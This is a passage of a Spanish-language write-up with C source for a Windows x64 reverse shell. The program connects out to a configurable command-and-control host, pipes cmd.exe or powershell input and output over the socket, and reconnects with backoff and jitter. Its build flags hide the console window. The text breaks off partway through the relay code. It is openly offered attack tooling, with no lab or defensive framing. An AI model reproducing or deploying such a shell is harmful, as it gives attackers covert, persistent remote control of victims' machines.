# Reverse shell Windows x64 — Winsock + pipes + reconexión

Arquitectura: bucle exterior de conexión con backoff exponencial + jitter; por cada sesión se crean dos pipes anónimos, se lanza `cmd.exe` con `STARTF_USESTDHANDLES` y dos hilos relay (socket→stdin, stdout→socket). La sesión se cierra cuando cualquiera de los relays termina, cuando el peer muere (chequeo `WSAPoll` periódico) o cuando el shell sale; después se hace `shutdown` + `TerminateProcess` sobre el hijo y se vuelve a conectar.

```c
/* revshell.c — reverse shell Windows x64
 *
 * Winsock2 -> cmd.exe sobre pipes anonimos -> reconexion con backoff
 * exponencial capado y jitter.
 *
 * MSVC:
 *   cl /O2 /W3 /DUNICODE /D_UNICODE revshell.c /link ws2_32.lib /SUBSYSTEM:WINDOWS
 * MinGW-w64:
 *   x86_64-w64-mingw32-gcc -O2 -municode -mwindows revshell.c -o revshell.exe -lws2_32
 *
 * Overrides de build: -DC2_HOST=L"10.0.0.5" -DC2_PORT=L"443" -DSHELL_CMD=L"powershell.exe"
 */

#define WIN32_LEAN_AND_MEAN
#if !defined(_WIN32_WINNT) || (_WIN32_WINNT < 0x0601)
#undef _WIN32_WINNT
#define _WIN32_WINNT 0x0601
#endif

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdlib.h>

#pragma comment(lib, "ws2_32.lib")

#ifndef C2_HOST
#define C2_HOST L"127.0.0.1"
#endif
#ifndef C2_PORT
#define C2_PORT L"4444"
#endif
#ifndef SHELL_CMD
#define SHELL_CMD L"cmd.exe /Q"
#endif

#define BACKOFF_BASE_MS    1000u
#define BACKOFF_MAX_MS     60000u
#define CONNECT_TIMEOUT_MS 10000u
#define RELAY_BUF_SIZE     8192

typedef struct {
    SOCKET sock;
    HANDLE pipe;
} RELAY_CTX;

/* ------------------------------------------------------------------ */
/* Envio completo: send() puede aceptar menos bytes de los pedidos.    */
/* ------------------------------------------------------------------ */
static int send_all(SOCKET s, const char *buf, int len)
{
    int off = 0;
    while (off < len) {
        int n = send(s, buf + off, len - off, 0);
        if (n <= 0)
            return -1;
        off += n;
    }
    return 0;
}

/* ------------------------------------------------------------------ */
/* Relay A: lo que llega del socket se escribe en el stdin del shell.  */
/* Sale con recv<=0 (peer cerrado) o WriteFile fallido (pipe roto).    */
/* ------------------------------------------------------------------ */
static DWORD WINAPI relay_sock_to_pipe(LPVOID param)
{
    RELAY_CTX *c = (RELAY_CTX *)param;
    char buf[RELAY_BUF_SIZE];

    for (;;) {
        int n = recv(c->sock, buf, sizeof(buf), 0);
        if (n <= 0)
            break;

        {
            DWORD written = 0;
            if (!WriteFile(c->pipe, buf, (DWORD)n, &written, NULL) || written != (DWORD)n)
                break;
